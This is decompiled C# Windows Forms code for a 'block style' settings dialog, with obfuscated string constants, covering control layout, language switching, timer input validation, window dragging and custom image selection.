		this.paneltimer.Controls.Add(this.timerduration);
		this.paneltimer.Controls.Add(this.DrakeWidth_W2);
		this.paneltimer.Controls.Add(this.combotimers);
		this.paneltimer.Dock = System.Windows.Forms.DockStyle.Top;
		this.paneltimer.Location = new System.Drawing.Point(0, 80);
		this.paneltimer.Name = EXGuarder._6A124B71;
		this.paneltimer.Padding = new System.Windows.Forms.Padding(8);
		this.paneltimer.Size = new System.Drawing.Size(745, 40);
		this.paneltimer.TabIndex = 47;
		this.paneltimer.Visible = false;
		this.checkshowtimer.CheckBoxColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkshowtimer.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkshowtimer.Dock = System.Windows.Forms.DockStyle.Fill;
		this.checkshowtimer.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f, System.Drawing.FontStyle.Bold);
		this.checkshowtimer.ForeColor = System.Drawing.Color.White;
		this.checkshowtimer.Location = new System.Drawing.Point(8, 8);
		this.checkshowtimer.Name = EXGuarder._696A3662;
		this.checkshowtimer.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkshowtimer.Size = new System.Drawing.Size(378, 24);
		this.checkshowtimer.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkshowtimer.TabIndex = 7;
		this.checkshowtimer.Text = EXGuarder._23570658;
		this.timerduration.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.timerduration.Dock = System.Windows.Forms.DockStyle.Right;
		this.timerduration.DoubleValue = 1.0;
		this.timerduration.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.timerduration.FillDisableColor = System.Drawing.Color.FromArgb(45, 45, 45);
		this.timerduration.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f);
		this.timerduration.ForeColor = System.Drawing.Color.White;
		this.timerduration.IntValue = 1;
		this.timerduration.Location = new System.Drawing.Point(386, 8);
		this.timerduration.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.timerduration.Maximum = 2147483647.0;
		this.timerduration.Minimum = -2147483648.0;
		this.timerduration.Name = EXGuarder._40105C46;
		this.timerduration.Padding = new System.Windows.Forms.Padding(5);
		this.timerduration.Radius = 15;
		this.timerduration.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.timerduration.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.timerduration.Size = new System.Drawing.Size(168, 25);
		this.timerduration.Style = DrakeUI.Framework.UIStyle.Custom;
		this.timerduration.TabIndex = 18;
		this.timerduration.Text = EXGuarder._645F3849;
		this.timerduration.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.timerduration.Watermark = EXGuarder._645F3849;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(554, 8);
		this.DrakeWidth_W2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W2.Name = EXGuarder._2E740570;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(28, 24);
		this.DrakeWidth_W2.TabIndex = 21;
		this.combotimers.Dock = System.Windows.Forms.DockStyle.Right;
		this.combotimers.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combotimers.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.combotimers.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.combotimers.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f);
		this.combotimers.ForeColor = System.Drawing.Color.White;
		this.combotimers.Items.AddRange(new object[4]
		{
			EXGuarder._410C4F71,
			EXGuarder._5B1A230C,
			EXGuarder._3E791A59,
			EXGuarder._6C5E104B
		});
		this.combotimers.Location = new System.Drawing.Point(582, 8);
		this.combotimers.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.combotimers.MinimumSize = new System.Drawing.Size(63, 0);
		this.combotimers.Name = EXGuarder._0D424370;
		this.combotimers.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combotimers.Radius = 15;
		this.combotimers.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.combotimers.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combotimers.Size = new System.Drawing.Size(155, 25);
		this.combotimers.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combotimers.TabIndex = 20;
		this.combotimers.Text = EXGuarder._5B1A230C;
		this.combotimers.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.combotimers.Watermark = EXGuarder._6B5E6978;
		this.Panel5.Controls.Add(this.blockmsgstr);
		this.Panel5.Controls.Add(this.inputtext2);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel5.Location = new System.Drawing.Point(0, 40);
		this.Panel5.Name = EXGuarder._12780356;
		this.Panel5.Padding = new System.Windows.Forms.Padding(8);
		this.Panel5.Size = new System.Drawing.Size(745, 40);
		this.Panel5.TabIndex = 46;
		this.blockmsgstr.Cursor = System.Windows.Forms.Cursors.Hand;
		this.blockmsgstr.Dock = System.Windows.Forms.DockStyle.Fill;
		this.blockmsgstr.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockmsgstr.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockmsgstr.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockmsgstr.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockmsgstr.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockmsgstr.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f, System.Drawing.FontStyle.Bold);
		this.blockmsgstr.ForeHoverColor = System.Drawing.Color.Gray;
		this.blockmsgstr.Location = new System.Drawing.Point(8, 8);
		this.blockmsgstr.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.blockmsgstr.Name = EXGuarder._3913570B;
		this.blockmsgstr.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.blockmsgstr.RectColor = System.Drawing.Color.Gray;
		this.blockmsgstr.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.blockmsgstr.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockmsgstr.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockmsgstr.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blockmsgstr.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.blockmsgstr.Size = new System.Drawing.Size(378, 24);
		this.blockmsgstr.Style = DrakeUI.Framework.UIStyle.Custom;
		this.blockmsgstr.Symbol = 0;
		this.blockmsgstr.TabIndex = 39;
		this.blockmsgstr.Text = EXGuarder._75714303;
		this.blockmsgstr.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel1.Controls.Add(this.blackthemetxt);
		this.Panel1.Controls.Add(this.comboblock);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = EXGuarder._2E290825;
		this.Panel1.Padding = new System.Windows.Forms.Padding(8);
		this.Panel1.Size = new System.Drawing.Size(745, 40);
		this.Panel1.TabIndex = 45;
		this.blackthemetxt.Cursor = System.Windows.Forms.Cursors.Hand;
		this.blackthemetxt.Dock = System.Windows.Forms.DockStyle.Fill;
		this.blackthemetxt.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blackthemetxt.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blackthemetxt.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blackthemetxt.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blackthemetxt.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blackthemetxt.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f, System.Drawing.FontStyle.Bold);
		this.blackthemetxt.ForeHoverColor = System.Drawing.Color.Gray;
		this.blackthemetxt.Location = new System.Drawing.Point(8, 8);
		this.blackthemetxt.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.blackthemetxt.Name = EXGuarder._2A1B7347;
		this.blackthemetxt.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.blackthemetxt.RectColor = System.Drawing.Color.Gray;
		this.blackthemetxt.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.blackthemetxt.RectHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blackthemetxt.RectPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blackthemetxt.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.blackthemetxt.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.blackthemetxt.Size = new System.Drawing.Size(378, 24);
		this.blackthemetxt.Style = DrakeUI.Framework.UIStyle.Custom;
		this.blackthemetxt.Symbol = 0;
		this.blackthemetxt.TabIndex = 38;
		this.blackthemetxt.Text = EXGuarder._69000A52;
		this.blackthemetxt.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.comboblock.Dock = System.Windows.Forms.DockStyle.Right;
		this.comboblock.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboblock.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comboblock.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.comboblock.Font = new System.Drawing.Font(EXGuarder._26602A17, 9f);
		this.comboblock.ForeColor = System.Drawing.Color.White;
		this.comboblock.Items.AddRange(new object[5]
		{
			EXGuarder._32752752,
			EXGuarder._392C3105,
			EXGuarder._664C1E50,
			EXGuarder._271B0843,
			EXGuarder._29276E2C
		});
		this.comboblock.Location = new System.Drawing.Point(386, 8);
		this.comboblock.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.comboblock.MinimumSize = new System.Drawing.Size(63, 0);
		this.comboblock.Name = EXGuarder._79281741;
		this.comboblock.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboblock.Radius = 15;
		this.comboblock.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboblock.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboblock.Size = new System.Drawing.Size(351, 25);
		this.comboblock.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboblock.TabIndex = 19;
		this.comboblock.Text = EXGuarder._32752752;
		this.comboblock.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.comboblock.Watermark = EXGuarder._6B5E6978;
		this.DrakeWidth_W8.BackColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeWidth_W8.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeWidth_W8.Location = new System.Drawing.Point(0, 424);
		this.DrakeWidth_W8.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.DrakeWidth_W8.Name = EXGuarder._184B5F17;
		this.DrakeWidth_W8.Size = new System.Drawing.Size(747, 1);
		this.DrakeWidth_W8.TabIndex = 46;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(747, 425);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.toppanel);
		base.Controls.Add(this.DrakeWidth_W5);
		base.Controls.Add(this.DrakeWidth_W7);
		base.Controls.Add(this.DrakeWidth_W4);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.DrakeWidth_W8);
		this.ForeColor = System.Drawing.Color.White;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._15493A33);
		base.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		base.Name = EXGuarder._11373047;
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = EXGuarder._11373047;
		base.TopMost = true;
		this.Panel4.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.custompanel.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.imgbox).EndInit();
		this.paneltimer.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		this.Panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void translateme()
	{
		checkshowtimer.Text = BTConst.shwtimrstr;
		object value = BTRegistry.GetValue(EXGuarder._2C3D600A, EXGuarder._12563751);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._4B262846, TextCompare: false))
		{
			msgtitle.Text = EXGuarder._706B0D76;
			blackthemetxt.Text = EXGuarder._704D1D52;
			blockmsgstr.Text = EXGuarder._23452C1C;
			inputtext2.Watermark = EXGuarder._5065720F;
			comboblock.Items.Clear();
			comboblock.Items.AddRange(new string[5]
			{
				EXGuarder._0C3C1A47,
				EXGuarder._27511346,
				EXGuarder._421F4707,
				EXGuarder._53732A48,
				EXGuarder._17197315
			});
			combotimers.Items.Clear();
			combotimers.Items.AddRange(new string[4]
			{
				EXGuarder._4A74121B,
				EXGuarder._262E670F,
				EXGuarder._77370D58,
				EXGuarder._1F1D3446
			});
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._6A696158, TextCompare: false))
		{
			msgtitle.Text = EXGuarder._07204615;
			blackthemetxt.Text = EXGuarder._2175391B;
			blockmsgstr.Text = EXGuarder._01763E1A;
			inputtext2.Watermark = EXGuarder._18574C29;
			comboblock.Items.Clear();
			comboblock.Items.AddRange(new string[5]
			{
				EXGuarder._45115D71,
				EXGuarder._56367667,
				EXGuarder._77492954,
				EXGuarder._4C6F2C04,
				EXGuarder._333B391C
			});
			combotimers.Items.Clear();
			combotimers.Items.AddRange(new string[4]
			{
				EXGuarder._424B3D4D,
				EXGuarder._0E3B7206,
				EXGuarder._4B0E4853,
				EXGuarder._260C0472
			});
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._1B591542, TextCompare: false))
		{
			msgtitle.Text = EXGuarder._5D196B68;
			blackthemetxt.Text = EXGuarder._0E352940;
			blockmsgstr.Text = EXGuarder._57543329;
			inputtext2.Watermark = EXGuarder._08655463;
			comboblock.Items.Clear();
			comboblock.Items.AddRange(new string[5]
			{
				EXGuarder._79746A03,
				EXGuarder._36585102,
				EXGuarder._5F29082E,
				EXGuarder._2012445E,
				EXGuarder._0573662D
			});
			combotimers.Items.Clear();
			combotimers.Items.AddRange(new string[4]
			{
				EXGuarder._33152B1B,
				EXGuarder._0F093F33,
				EXGuarder._2D080A28,
				EXGuarder._742D7045
			});
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._1E321C28, TextCompare: false))
		{
			msgtitle.Text = EXGuarder._6E433A07;
			blackthemetxt.Text = EXGuarder._5B202821;
			blockmsgstr.Text = EXGuarder._730A7168;
			inputtext2.Watermark = EXGuarder._66086310;
			comboblock.Items.Clear();
			comboblock.Items.AddRange(new string[5]
			{
				EXGuarder._512A2467,
				EXGuarder._76575845,
				EXGuarder._781B0008,
				EXGuarder._2B235954,
				EXGuarder._42592021
			});
			combotimers.Items.Clear();
			combotimers.Items.AddRange(new string[4]
			{
				EXGuarder._6D203D26,
				EXGuarder._15616806,
				EXGuarder._1902683B,
				EXGuarder._78277527
			});
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._00246737, TextCompare: false))
		{
			msgtitle.Text = EXGuarder._4C0B4B3B;
			blackthemetxt.Text = EXGuarder._23682C43;
			blockmsgstr.Text = EXGuarder._6F163739;
			inputtext2.Watermark = EXGuarder._673F0021;
			comboblock.Items.Clear();
			comboblock.Items.AddRange(new string[5]
			{
				EXGuarder._2A3A6B36,
				EXGuarder._52241961,
				EXGuarder._1A37565C,
				EXGuarder._07450C67,
				EXGuarder._53086700
			});
			combotimers.Items.Clear();
			combotimers.Items.AddRange(new string[4]
			{
				EXGuarder._33393C17,
				EXGuarder._2A146141,
				EXGuarder._411F6271,
				EXGuarder._23425C27
			});
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._085C1944, TextCompare: false))
		{
			msgtitle.Text = EXGuarder._173E1E78;
			blackthemetxt.Text = EXGuarder._5B67333D;
			blockmsgstr.Text = EXGuarder._68633C53;
			inputtext2.Watermark = EXGuarder._18304037;
			comboblock.Items.Clear();
			comboblock.Items.AddRange(new string[5]
			{
				EXGuarder._0C045B43,
				EXGuarder._3B4F696D,
				EXGuarder._1A37565C,
				EXGuarder._5E104A2C,
				EXGuarder._53086700
			});
			combotimers.Items.Clear();
			combotimers.Items.AddRange(new string[4]
			{
				EXGuarder._33393C17,
				EXGuarder._2A146141,
				EXGuarder._411F6271,
				EXGuarder._36135B74
			});
		}
	}

	private void okbtn_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.OK;
		Close();
	}

	private void comboblock_SelectedIndexChanged(object sender, EventArgs e)
	{
		if (comboblock.SelectedIndex == 1)
		{
			paneltimer.Visible = true;
		}
		else
		{
			paneltimer.Visible = false;
		}
		if (comboblock.SelectedIndex != 0 && comboblock.SelectedIndex != 4)
		{
			inputtext2.Text = EXGuarder._2B77760A;
			inputtext2.Enabled = false;
		}
		else
		{
			inputtext2.Enabled = true;
		}
		if (comboblock.SelectedIndex == 4)
		{
			BTAlerter.infos(BTConst.recmndimgstr);
			custompanel.Visible = true;
		}
		else
		{
			custompanel.Visible = false;
		}
	}

	private void nobtn_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.No;
		Close();
	}

	private void msgtitle_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void Panel2_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void blockstyle_Load(object sender, EventArgs e)
	{
		translateme();
		comboblock.SelectedIndex = 0;
		imgbox.Tag = EXGuarder._4E253574;
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = EXGuarder._220B2336;
		DialogResult dialogResult = openFileDialog.ShowDialog();
		if (dialogResult == DialogResult.OK)
		{
			string fileName = openFileDialog.FileName;
			if (!codes.IsImageFile(openFileDialog.FileName))
			{
				BTAlerter.erroes(string.Format(EXGuarder._400A1D4F, EXGuarder._5D2E6835));
				return;
			}
			imgbox.Tag = fileName;
			imgbox.Image = codes.ReadBitmapFromFile(fileName);
		}
	}

	private void timerduration_TextChanged(object sender, EventArgs e)
	{
		int selectionStart = timerduration.SelectionStart;
		string text = Regex.Replace(timerduration.Text, EXGuarder._0B191421, EXGuarder._59594E4B);
		int num = text.IndexOf('.');
		if (num != -1)
		{
			text = checked(text.Substring(0, num + 1) + text.Substring(num + 1).Replace(EXGuarder._6E256952, EXGuarder._59594E4B));
		}
		timerduration.Text = text;
		timerduration.SelectionStart = Math.Min(selectionStart, timerduration.Text.Length);
	}

	private void timerduration_KeyPress(object sender, KeyPressEventArgs e)
	{
		if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar) && (e.KeyChar != '.' || timerduration.Text.Contains(EXGuarder._2018156C)))
		{
			e.Handled = true;
			BTAlerter.infos(BTConst.onlynumstr);
		}
	}
}
